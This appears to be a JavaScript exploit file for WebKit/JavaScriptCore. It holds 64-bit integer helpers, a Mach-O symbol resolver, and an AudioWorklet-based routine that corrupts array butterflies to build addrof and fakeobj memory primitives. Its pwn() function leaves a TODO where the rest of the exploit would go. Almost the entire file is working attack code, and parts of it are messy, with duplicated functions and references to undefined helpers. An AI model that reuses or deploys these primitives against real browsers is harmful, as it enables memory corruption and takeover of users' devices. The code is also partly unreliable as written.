// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

/*function print(s){
    alert(s);
}*/

// Return the hexadecimal representation of the given byte.
function dec2hex(n) {
        if(n < 0) {
            n = 0xFFFFFFFF + n + 1;
        }
        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
    }

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join("");
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== "undefined")
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, " ");
        lines.push(parts.join(" "));
    }

    return lines.join("\n");
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case "number":
            v = "0x" + Math.floor(v).toString(16);
        case "string":
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = "0" + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case "object":
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case "undefined":
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return "0x" + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}
// That's all the arithmetic we need for exploiting WebKit.. :)

//fuck.port.postMessage("starting");

function dec2hex(n) {
        if(n < 0) {
            n = 0xFFFFFFFF + n + 1;
        }
        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
    }
function hex2a(hex) {
var str = "";
for (var i = 0; i < hex.length; i += 2) {
    var v = parseInt(hex.substr(i, 2), 16);
    if (v) str += String.fromCharCode(v);
}
return str;
}
    function _u32(i)
{
    return b2u32(this.read(i, 4));
}

function fsyms(mem, base, segs, want, syms)
{
    want = Array.from(want); // copy
    if(syms === undefined)
    {
        syms = {};
    }

    var stab = null;
    alert1("here");
    var ncmds = memory.u32(Add(base, 0x10));
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = memory.u32(Add(base, off))
        if(cmd == 0x2) // LC_SYMTAB
        {
            var b = memory.read(Add(base, off + 0x8), 0x10);
            stab =
            {
                symoff:  b2u32(b.slice(0x8, 0xc)),
                nsyms:   b2u32(b.slice(0xc, 0x10)),
                stroff:  b2u32(b.slice(0x10, 0x14)),
                strsize: b2u32(b.slice(0x14, 0x18)),
            };
            break;
        }
        off += memory.u32(Add(base, off + 0x4));
    }
    if(stab == null)
    {
        fail("stab");
    }
    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
    var fn = function(i)
    {
        return memory.read(Add(tmp.base, tmp.off + i),0x10);
    };
    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
    {
        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
        for(var j = 0; j < want.length; ++j)
        {
            var s = want[j];
            if((strcmp(fn, s)))
            {
                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                want.splice(j, 1);
                break;
            }
        }
    }
    return syms;
}

var FPO = typeof(SharedArrayBuffer) === "undefined" ? 0x18 : 0x10;
var VM_PROT_NONE = 0x0
var VM_PROT_READ = 0x1
var VM_PROT_WRITE = 0x2
var VM_PROT_EXECUTE = 0x4

function b2u32(b){
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}
function hexdump1(buffer, blockSize, base) {
    blockSize = blockSize || 16;
    var lines = [];
    var hex = "0123456789ABCDEF";
    for (var b = 0; b < buffer.length; b += blockSize) {
        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
        var codes = block.split('').map(function (ch) {
            var code = ch.charCodeAt(0);
            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
        }).join("");
        codes += "   ".repeat(blockSize - block.length);
        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
        chars +=  " ".repeat(blockSize - block.length);
        lines.push(addr + " " + codes + "  " + chars);
    }
    return lines.join("<br/>");
}

function mappedAddress(mapping, addr1) {
    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
    for (cc = 0; cc < mapping.length; ++cc) {
        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
            // >= <
            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
            //alert("debug-cacheoffset:" + cacheoffset)
            return cacheoffset;
        }
        else {
            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
        }
    }
}
function off2addr(mappings, off)
    {
  
        if(!(off instanceof Int64)) off = new Int64(off);
        for(var i = 0; i < mappings.length; ++i)
        {
            var start = mappings[i].fileoff; //cachestart
            var end   = Add(start, segs[i].size); //cacheend
           // alert("start" + start + "end" + end + "off" + off)
            if
            (
                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
            )
            {
                //print1ic = 1;
                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                return Add(mappings[i].addr, Sub(off, start));
            }

        }
        //return new Int64("0x4141414141414141");
    }

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

b.process = (inputs, outputs, parameters) => {
          const kBoxedDoubleOffset = 0x0002000000000000n;
          function boxDouble(d) {
            return d + kBoxedDoubleOffset;
          }
          function unboxDouble(d) {
            return d - kBoxedDoubleOffset;
          }
          // the structure ID is wrong, but we'll fix it :)
          let doubleArrayCellHeader = 0x0108230700000000n;
          let f = new Float64Array(1);
          let u = new Uint32Array(f.buffer);
          function float2bigint(v) {
            f[0] = v;
            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
          }
          function bigint2float(v) {
            u[0] = Number(v & 0xffffffffn);
            u[1] = Number(v >> 32n);
            return f[0];
          }

          // store things to prevent GC
          let keep = [];
          function gc(n=10000) {
            let tmp = [];
            for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
          }

          // message port to talk to main thread; will be set later
          let port = null;

          // will be implemented later
          let fakeobj = null;
          let addrof = null;

          for (var i = 0; i < 100; i++) keep.push([1.1*i]);
          let a0 = [0,0,0,0,0,0,0,0,0,0];
          let a1 = [0,0,0,0,0,0,0,0,0,0];
          // transition to unboxed double storage
          a1[3] = 13.37;
          let b0 = [0,0,0,0,0,0,0,0,0,0];
          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array

          // put zeroes in first two slots so JSCallbackData destruction is safe
          delete b1[0];
          delete b1[1];

          function setupPrimitives() {
            fuck.port.postMessage("setting up");
            if (a1.length != 0x1337) {
              fuck.port.postMessage("Failure on array length");
              return;
            }

            const kSentinel = 1333.337;
            let offset = -1;

            b1[0] = kSentinel;
            // scan for the sentinel to find the offset from a to b
            for (var i = 0; i < 0x100; i++) {
              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
                offset = i;
                break;
              }
            }
            if (offset == -1) {
              fuck.port.postMessage("Failure finding offset");
              return;
            }

            // temporary implementations
            addrof = (val) => {
              b1[0] = val;
              return float2bigint(a1[offset]);
            }
            fakeobj = (addr) => {
              a1[offset] = bigint2float(addr);
              return b1[0];
            }

            let obj = {
              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
              fakeButterfly: a0
            };

            let addr = addrof(obj);
            fuck.port.postMessage("obj @ " + addr.toString(16));

            let fakeArr = fakeobj(addr + 0x10n);

            // subtract off the incref
            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
            fuck.port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));

            // fix broken cell header
            fakeArr[0] = bigint2float(doubleArrayCellHeader);

            // grab a real butterfly pointer
            let doubleArrayButterfly = float2bigint(fakeArr[1]);

            // fix other broken cell header
            obj.fakeButterfly = b0;
            fakeArr[0] = bigint2float(doubleArrayCellHeader);

            // fix the broken butterflys and setup cleaner addrof / fakeobj
            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
            obj.fakeButterfly = a1;
            fakeArr[1] = bigint2float(doubleArrayButterfly);
            obj.fakeButterfly = b1;
            fakeArr[1] = bigint2float(doubleArrayButterfly);

            fakeobj = (addr) => {
              a1[0] = bigint2float(addr);
              return b1[0];
            }
            addrof = (val) => {
              b1[0] = val;
              return float2bigint(a1[0]);
            }
          }

          function pwn() {
              setupPrimitives();

              // ensure we can survive GC
              gc();

              // TODO: rest of exploit goes here

              port.postMessage("done!");
          }

          registerProcessor("OrigineWorklet", class {
            constructor() {
              // setup a message port to the main thread
              var port = new AudioWorkletProcessor().port;
              port.postMessage("hey");
              port.onmessage = pwn;
              //fuck = this;

              // this part is magic
              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
              eval('1 + 0x1336');

              // overwrite a1's butterfly with a fastMalloc pointer
              return {fill: 1, a: a0};
            }
              process (inputs, outputs, parameters) {
    return false
  }
          });
          registerProcessor("OrigineWorklet2", class {
            constructor() {
              fuck = this;
              // overwrite b1's butterfly with a fastMalloc pointer
              return {fill: 1, b: b0};
            }
              process (inputs, outputs, parameters) {
    return false
  }
          });
    }
    //process();

